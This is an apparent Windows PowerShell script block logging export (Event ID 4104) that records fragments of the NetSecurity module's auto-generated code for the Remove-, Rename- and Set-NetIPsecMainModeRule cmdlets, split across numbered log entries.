    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEP1AuthSet')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecPhase1AuthSet},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeCryptoSet', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEMMCryptoSet')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecMainModeCryptoSet},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${TracePolicyStore},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetMainModeRule')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${NewPolicyStore},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${NewGPOSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${NewName},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(Paramete

ScriptBlock ID: 4cfc0bc4-892a-446d-8c97-3f4fcceb24f0
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (5 of 9):
ewallProfile}, 'MSFT_NetMainModeRuleInProfile', 'GroupComponent', 'PartComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecPhase1AuthSet') -and (@('ByAssociatedNetIPsecPhase1AuthSet') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecPhase1AuthSet}, 'MSFT_NetMainModeRuleMMAuthSet', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecMainModeCryptoSet') -and (@('ByAssociatedNetIPsecMainModeCryptoSet') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecMainModeCryptoSet}, 'MSFT_NetMainModeRuleMMCryptoSet', 'PartComponent', 'GroupComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallProfile', 'ByAssociatedNetIPsecPhase1AuthSet', 'ByAssociatedNetIPsecMainModeCryptoSet', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallProfile', 'ByAssociatedNetIPsecPhase1AuthSet', 'ByAssociatedNetIPsecMainModeCryptoSet', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }
    if ($PSBoundParameters.ContainsKey('TracePolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallProfile', 'ByAssociatedNetIPsecPhase1AuthSet', 'ByAssociatedNetIPsecMainModeCryptoSet', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('TracePolicyStore', ${TracePolicyStore})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetFirewallAddressFilter', 'ByAssociatedNetFirewallProfile', 'ByAssociatedNetIPsecPhase1AuthSet', 'ByAssociatedNetIPsecMainModeCryptoSet', 'GetAll', 'InputObject (cdxml)') -contains $_ } {
      $__cmdletization_returnValue = $null
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:DeleteInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecMainModeRule.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Remove-NetIPsecMainModeRule' -Alias '*'
        

function Rename-NetIPsecMainModeRule
{
    [CmdletBinding(DefaultParameterSetName='GetAll', SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetMainModeRule')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [Alias('ID')]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayName},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Description},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${DisplayGroup},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Group},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Enabled[]]
    ${Enabled},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${MainModeCryptoSet},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Phase1AuthSet},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PrimaryStatus[]]
    ${PrimaryStatus},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Status},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${PolicyStoreSource},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PolicyStoreType[]]
    ${PolicyStoreSourceType},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetAddressFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallAddressFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetFirewallProfile')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallProfile},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEP1AuthSet')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecPhase1AuthSet},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeCryptoSet', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEMMCryptoSet')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecMainModeCryptoSet},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${TracePolicyStore},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetMainModeRule')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='ByName', Mandatory=$true)]
    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [Parameter(ParameterSetName='ByQuery', Mandatory=$true)]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter', Mandatory=$true)]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile', Mandatory=$true)]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet', Mandatory=$true)]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeCryptoSet', Mandatory=$true)]
    [Parameter(ParameterSetName='GetAll', Mandatory=$true)]
    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true)]
    [string]
    ${NewName},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('InstanceID', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayName') -and (@('ByDisplayName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayName})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Description') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Description})
        $__cmdletization_queryBuilder.FilterByProperty('Description', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayGroup') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayGroup})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Group') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Group})
        $__cmdletization_queryBuilder.FilterByProperty('RuleGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Enabled') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Enabled})
        $__cmdletization_queryBuilder.FilterByProperty('Enabled', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('MainModeCryptoSet') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${MainModeCryptoSet})
        $__cmdletization_queryBuilder.FilterByProperty('MainModeCryptoSet', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Phase1AuthSet') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Phase1AuthSet})
        $__cmdletization_queryBuilder.FilterByPro

ScriptBlock ID: 4cfc0bc4-892a-446d-8c97-3f4fcceb24f0
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (4 of 9):
rationOption:LocalAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:LocalAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('RemoteAddress')) {
            [object]$__cmdletization_value = ${RemoteAddress}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:RemoteAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'cim:OperationOption:RemoteAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = $null
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:ModifyInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecMainModeRule.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Set-NetIPsecMainModeRule' -Alias '*'
        

function Remove-NetIPsecMainModeRule
{
    [CmdletBinding(DefaultParameterSetName='GetAll', SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetMainModeRule')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [Alias('ID')]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayName},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Description},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${DisplayGroup},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Group},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.Enabled[]]
    ${Enabled},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${MainModeCryptoSet},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Phase1AuthSet},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PrimaryStatus[]]
    ${PrimaryStatus},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Status},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${PolicyStoreSource},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PolicyStoreType[]]
    ${PolicyStoreSourceType},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetAddressFilter')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallAddressFilter},

    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetFirewallProfile')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetFirewallProfile},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEP1AuthSet')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecPhase1AuthSet},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeCryptoSet', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEMMCryptoSet')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecMainModeCryptoSet},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecPhase1AuthSet')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeCryptoSet')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${TracePolicyStore},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetMainModeRule')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallAddressFilter')]
    [Parameter(ParameterSetName='ByAssociatedNetFirewallProfile')]
